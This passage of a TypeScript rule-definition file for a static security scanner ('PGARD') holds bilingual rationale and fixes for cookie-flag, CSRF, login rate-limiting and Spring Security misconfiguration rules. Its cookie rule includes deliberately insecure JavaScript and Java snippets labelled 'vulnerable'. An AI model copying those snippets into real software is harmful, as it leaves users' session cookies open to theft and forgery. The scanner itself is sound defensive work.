      ko: "세션·인증 쿠키에는 세 가지를 모두 설정하세요: `res.cookie('sid', token, { httpOnly: true, secure: true, sameSite: 'lax' })`, Go에서는 `http.Cookie{HttpOnly: true, Secure: true, SameSite: http.SameSiteLaxMode}`. 다른 사이트의 링크로 들어올 일이 없다면 `strict`를 쓰세요. Secure는 HTTPS가 필요하지만 Chrome, Firefox 같은 브라우저는 `http://localhost`에서도 Secure 쿠키를 받아들이므로 그곳의 개발에서는 켜 둘 수 있습니다. Java에서는 `setHttpOnly(true)`와 `setSecure(true)`를 호출하세요.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "res.cookie('sid', token);",
        safe: "res.cookie('sid', token, { httpOnly: true, secure: true, sameSite: 'lax' });",
      },
      {
        language: "java",
        vulnerable: 'response.addCookie(new Cookie("sessionId", id));',
        safe: 'Cookie cookie = new Cookie("sessionId", id);\ncookie.setHttpOnly(true);\ncookie.setSecure(true);\nresponse.addCookie(cookie);',
      },
    ],
  },
  {
    id: "PG-CSRF-001",
    title: "Cookie-authenticated state-changing routes without visible CSRF protection",
    category: "csrf",
    defaultSeverity: "medium",
    scope: "code",
    languages: [...JS_TS, "java", "kotlin"],
    standards: {
      owasp: ["A01:2025"],
      cwe: ["CWE-352"],
      cert: [],
      noDirectCert: {
        en: "No CERT rule maps directly.",
        ko: "직접 대응하는 CERT 규칙이 없습니다.",
      },
    },
    rationale: {
      en: "A route that changes state and authenticates only by cookie can be triggered by any website the user visits: the browser attaches the cookie to a forged form post or fetch. PGARD counts POST routes. PUT, PATCH and DELETE need a CORS preflight, so they count unless CORS is provably restrictive (none, or a fixed origin list); unresolvable CORS options, hand-set credentials headers and method-override keep them in. Java/Kotlin: Spring Security `csrf().disable()` on a session-based chain.",
      ko: "상태를 바꾸면서 쿠키로만 인증하는 라우트는 로그인한 사용자가 방문한 아무 웹사이트에서나 호출될 수 있습니다. 브라우저가 위조된 폼 전송이나 fetch에도 쿠키를 실어 보내기 때문입니다. 공격자는 피해자 권한으로 계정 이메일을 바꾸거나, 송금하거나, 데이터를 삭제할 수 있습니다. PGARD는 POST 라우트를 대상으로 합니다. PUT, PATCH, DELETE는 CORS preflight가 필요하므로 CORS가 확실히 제한적(없거나 고정 출처 목록)이지 않으면 포함합니다. 해석할 수 없는 CORS 옵션, 직접 설정한 credentials 헤더, method-override가 있으면 계속 포함합니다. Java/Kotlin: 세션 기반 체인의 Spring Security `csrf().disable()`도 보고합니다.",
    },
    remediation: {
      en: "Add a CSRF token to every state-changing request (a synchronizer token or double-submit cookie from a maintained middleware), set session cookies to `SameSite=Lax` or `Strict`, and check the `Origin` or `Sec-Fetch-Site` header. Never change state on GET requests. In Spring Security keep CSRF on for session apps; turn it off only for a STATELESS API that authenticates with a bearer token.",
      ko: "상태를 바꾸는 모든 요청에 CSRF 토큰을 추가하고(유지보수되는 미들웨어의 synchronizer token이나 double-submit 쿠키), 세션 쿠키는 `SameSite=Lax` 또는 `Strict`로 설정하며, `Origin`이나 `Sec-Fetch-Site` 헤더를 확인하세요. GET 요청으로 상태를 바꾸지 마세요. Spring Security에서는 세션 기반 앱의 CSRF 보호를 켜 두고, bearer 토큰으로 인증하는 STATELESS API에서만 끄세요.",
    },
  },
  {
    id: "PG-BRUTE-001",
    title: "Login or password reset route without visible rate limiting",
    category: "brute_force",
    defaultSeverity: "medium",
    scope: "code",
    languages: JS_TS,
    standards: { owasp: ["A07:2025"], cwe: ["CWE-307"], cert: [] },
    rationale: {
      en: "Without a limit on attempts, an attacker can try thousands of passwords per minute against one account, try one common password against many accounts (password spraying), replay leaked username and password pairs (credential stuffing), or guess short password-reset codes.",
      ko: "시도 횟수에 제한이 없으면 공격자는 한 계정에 분당 수천 개의 비밀번호를 대입하거나, 흔한 비밀번호 하나를 여러 계정에 시도(password spraying)하거나, 유출된 계정·비밀번호 쌍을 재사용(credential stuffing)하거나, 짧은 비밀번호 재설정 코드를 추측할 수 있습니다.",
    },
    remediation: {
      en: "Limit attempts per account and per IP on login, password-reset and code-verification routes, for example with `express-rate-limit` plus increasing delays or a temporary lockout after repeated failures. Return the same error for an unknown user and a wrong password, and consider MFA. Prefer delays to permanent lockout, which attackers can use to lock real users out.",
      ko: "로그인, 비밀번호 재설정, 코드 검증 라우트에 계정별·IP별 시도 제한을 두세요. 예를 들어 `express-rate-limit`에 더해 실패가 반복되면 지연을 늘리거나 일시적으로 잠그세요. 없는 사용자와 틀린 비밀번호에는 같은 오류를 돌려주고 MFA도 고려하세요. 영구 잠금은 공격자가 실제 사용자를 잠그는 데 악용할 수 있으므로 지연 방식을 우선하세요.",
    },
  },
  {
    id: "PG-CONF-001",
    title: "Spring Security or Spring Boot configuration that weakens access control",
    category: "misconfiguration",
    defaultSeverity: "medium",
    scope: "code",
    languages: ["java", "kotlin"],
    standards: {
      owasp: ["A01:2025", "A02:2025"],
      cwe: ["CWE-942", "CWE-862"],
      cert: [],
      noDirectCert: {
        en: "No CERT rule maps directly.",
        ko: "직접 대응하는 CERT 규칙이 없습니다.",
      },
    },
    rationale: {
      en: "Some Spring configuration removes access control. `anyRequest().permitAll()` as the last rule opens every path no earlier rule names. `web.ignoring()` takes paths out of the filter chain (no authentication, headers or CSRF); only static resources belong there. CORS with every origin (`*`) and credentials lets any site read authenticated responses. Low severity: security debug logging, and `management.endpoints.web.exposure.include=*` without Spring Security.",
      ko: "일부 Spring 설정은 접근 제어를 없앱니다. 마지막 규칙이 `anyRequest().permitAll()`이면 앞선 규칙에 없는 모든 경로가 열립니다. `web.ignoring()`은 경로를 필터 체인에서 빼 인증, 보안 헤더, CSRF가 모두 사라지므로 정적 리소스에만 써야 합니다. 모든 출처(`*`)와 자격 증명을 함께 허용하는 CORS는 아무 사이트나 인증된 응답을 읽게 합니다. 낮은 심각도: 보안 디버그 로그, Spring Security 없는 프로젝트의 `management.endpoints.web.exposure.include=*`.",
    },
    remediation: {
      en: "End the authorization rules with `anyRequest().authenticated()` or `denyAll()`. Use `web.ignoring()` only for static resources and open other public paths with `permitAll()` inside the filter chain. List exact origins when CORS allows credentials. Turn security debug logging off outside local development, and expose only the Actuator endpoints you need (`include=health,info`).",
      ko: "인가 규칙은 `anyRequest().authenticated()`나 `denyAll()`로 끝내세요. `web.ignoring()`은 정적 리소스에만 쓰고, 다른 공개 경로는 필터 체인 안에서 `permitAll()`로 여세요. 자격 증명을 허용하는 CORS에는 정확한 출처를 나열하세요. 보안 디버그 로그는 로컬 개발 밖에서는 끄고, Actuator는 필요한 엔드포인트만(`include=health,info`) 노출하세요.",
    },
  },
] as const satisfies readonly RuleDefinition[];

export type SourceRuleId = (typeof SOURCE_RULES)[number]["id"];

const DESCRIPTORS: readonly RuleDescriptor[] = SOURCE_RULES.map(defineRule);
const RULES_BY_ID = new Map<string, RuleDescriptor>(DESCRIPTORS.map((rule) => [rule.id, rule]));

export function getRule(id: SourceRuleId): RuleDescriptor {
  const rule = RULES_BY_ID.get(id);
  if (!rule) {
    throw new Error(`Unknown rule ${id}`);
  }
  return rule;
}

export function listSourceRules(): RuleDescriptor[] {
  return SOURCE_RULES.map(defineRule);
}

export const JS_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
  rule.languages.some((language: RuleLanguage) =>
    ["javascript", "typescript", "react"].includes(language),
  ),
).map((rule) => rule.id);

export const GO_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
  rule.languages.some((language: RuleLanguage) => language === "go"),
).map((rule) => rule.id);

export const VUE_RULE_IDS: SourceRuleId[] = ["PG-XSS-003"];

/** The rule that runs on MyBatis mapper XML (the other JVM rules read Java and Kotlin only). */
export const MYBATIS_RULE_IDS: SourceRuleId[] = ["PG-SQL-005"];

/** Rules that run on Java and Kotlin sources. */
export const JVM_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
  rule.languages.some((language: RuleLanguage) => language === "java" || language === "kotlin"),
).map((rule) => rule.id);

/** Rules that run on Python sources. */
export const PYTHON_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
  rule.languages.some((language: RuleLanguage) => language === "python"),
).map((rule) => rule.id);

/** Rules that run on PHP sources. */
export const PHP_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
  rule.languages.some((language: RuleLanguage) => language === "php"),
).map((rule) => rule.id);
